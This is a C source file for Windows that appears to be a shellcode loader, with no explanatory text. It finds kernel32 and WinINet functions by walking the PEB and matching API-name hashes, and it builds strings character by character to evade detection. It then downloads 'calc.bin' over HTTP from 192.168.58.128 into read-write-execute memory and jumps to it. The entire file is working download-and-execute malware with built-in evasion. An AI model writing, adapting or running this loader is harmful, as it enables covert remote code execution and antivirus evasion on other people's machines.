#include"common.h"
void mymain() {
	API_TABLE Api;
	HMODULE hKernel32 = myGetModuleHandle(Hash::Kernel32Hash);
	Api.LoadLibrayA = (myLoadLibraryA)myGetProcAddress(hKernel32, Hash::LoadLibraryAHash);
	char wininet[] = { 'w','i','n','i','n','e','t','.','d','l','l',0};
	HMODULE hWininet = Api.LoadLibrayA(wininet);
	
	Api.VirtualAlloc = (myVirtualAlloc)myGetProcAddress(hKernel32, Hash::VirtualAllocHash);
	Api.InternetOpenA = (myInternetOpenA)myGetProcAddress(hWininet, Hash::InternetOpenAHash);
	Api.InternetConnectA = (myInternetConnectA)myGetProcAddress(hWininet, Hash::InternetConnectAHash);
	Api.HttpOpenRequestA = (myHttpOpenRequestA)myGetProcAddress(hWininet, Hash::HttpOpenRequestAHash);
	Api.HttpSendRequestA = (myHttpSendRequestA)myGetProcAddress(hWininet, Hash::HttpSendRequestAHash);
	Api.InternetReadFile = (myInternetReadFile)myGetProcAddress(hWininet, Hash::InternetReadFileHash);

	void* exec_mem;
	DWORD payloadlen = 4096;
	DWORD nRead;

	exec_mem = Api.VirtualAlloc(0, payloadlen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


	char Agent[] = {'m','y','A','g','e','n','t',0};
	HINTERNET hInternet=Api.InternetOpenA(Agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	char server[] = { '1','9','2','.','1','6','8','.','5','8','.','1','2','8',0 };
	HINTERNET hConnect = Api.InternetConnectA(hInternet, server, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

	char Get[] = { 'G','E','T',0 };
	char path[] = { 'c','a','l','c','.','b','i','n' ,0};
	HINTERNET hRequest = Api.HttpOpenRequestA(hConnect, Get, path, NULL, NULL, NULL, 0, 0);

	BOOL bSend = Api.HttpSendRequestA(hRequest, NULL, 0, NULL, 0);

	while (!Api.InternetReadFile(hRequest, exec_mem, payloadlen, &nRead)) {
		return;
	}
	((void(*)())exec_mem)();

}


HMODULE myGetModuleHandle(DWORD dwModuleHash) {
#ifdef _WIN64
	PPEB pPeb = (PPEB)(__readgsqword(0x60));
#else
	PPEB pPeb = (PPEB)(__readfsdword(0x30));
#endif

	PPEB_LDR_DATA pLdr = pPeb->LoaderData;

	PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pLdr->InMemoryOrderModuleList.Flink - 0x10);
	PLIST_ENTRY pListHead = &pLdr->InMemoryOrderModuleList;
	PLIST_ENTRY pListNode = pListHead->Flink;
	
	while (pListHead != pListNode) {
		if (HashStringDjb2W(pDte->BaseDllName.Buffer) == dwModuleHash) {
			return (HMODULE)pDte->DllBase;
		}
		pDte = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pListNode->Flink - 0x10);
		pListNode = pListNode->Flink;
	}
	return NULL;
}

PVOID myGetProcAddress(HMODULE hModule, DWORD dwApiHash) {
	PBYTE pBase = (PBYTE)hModule;
	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pImgNtHdr = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);

	PIMAGE_EXPORT_DIRECTORY pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + pImgNtHdr->OptionalHeader.DataDirectory[0].VirtualAddress);

	PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExpDir->AddressOfNames);
	PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExpDir->AddressOfFunctions);
	PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExpDir->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pImgExpDir->NumberOfNames; i++) {
		char* FunctionName = (char*)(pBase + FunctionNameArray[i]);
		PVOID FunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
		if (HashStringDjb2A(FunctionName) == dwApiHash) {
			return FunctionAddress;
		}
	}
	return NULL;
}
